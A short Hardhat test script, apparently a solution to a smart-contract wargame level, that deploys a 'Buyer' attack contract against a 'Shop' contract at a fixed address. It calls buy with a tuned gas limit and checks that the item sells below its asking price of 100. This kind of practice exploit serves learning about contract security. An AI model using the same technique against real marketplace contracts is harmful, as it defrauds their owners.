import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", () => {
  it("Should work", async () => {
    const shop = await ethers.getContractAt("Shop", "0x360F9194Fe322d3FD823c4fe27ae5159be223402");

    const Buyer = await ethers.getContractFactory("Buyer");
    const buyer = await Buyer.deploy(shop.address);

    await buyer.buy({ gasLimit: 80003 });

    expect(await shop.isSold()).to.be.true;
    expect((await shop.price()).toNumber()).to.be.lt(100);
  })
})
